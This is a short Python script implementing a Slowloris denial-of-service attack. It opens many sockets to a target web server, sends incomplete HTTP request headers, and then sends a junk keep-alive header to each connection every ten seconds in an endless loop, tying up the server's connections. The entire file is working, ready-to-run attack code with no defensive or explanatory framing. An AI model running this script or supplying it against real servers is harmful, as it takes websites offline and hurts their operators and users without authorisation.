import socket
import time
import random

def slowloris_attack(target, port=80, sockets_count=100):
	print(f"[+] Starting Slowloris attack on {target}:{port} with {sockets_count} sockets")

	socket_list = []

	for _ in range(sockets_count):
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.settimeout(4)
			s.connect((target, port))
			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
			s.send("User-Agent: slowloris\r\n".encode("utf-8"))
			s.send("Accept-language: en-US,en,q=0.5\r\n".encode("utf-8"))
			socket_list.append(s)
		except socket.error:
			break

	while True:
		print(f"[+] Sending keep-alive headers to {len(socket_list)} sockets...")
		for s in list(socket_list):
			try:
				s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
			except socket.error:
				socket_list.remove(s)

		time.sleep(10)
